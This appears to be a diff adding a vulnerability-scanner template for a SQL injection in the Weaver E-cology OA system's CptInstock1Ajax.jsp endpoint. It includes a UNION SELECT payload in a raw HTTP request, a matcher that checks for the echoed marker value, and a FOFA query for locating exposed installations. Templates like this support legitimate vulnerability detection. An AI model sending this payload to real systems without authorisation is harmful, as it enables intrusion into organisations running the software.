@@ -1,0 +1,30 @@
+id: ecology-cptInstock1ajax-sqli
+
+info:
+  name: E-cology CptInstock1Ajax - SQL Injection
+  author: qwtd
+  severity: high
+  reference:
+    - https://mp.weixin.qq.com/s/JwJvSB4YxC32prmJuY3L0Q
+    - https://wiki.wy876.cn/#/./%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Cology%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3CptInstock1Ajax%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  metadata:
+    fofa-query: app="泛微-OA（e-cology）"
+  tags: 泛微-协同办公OA
+
+
+http:
+  - raw:
+      - |
+        GET /cpt/capital/CptInstock1Ajax.jsp?id=-1+union+all+select+98646213734,1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"98646213734")
+          - status_code == 200
+        condition: and
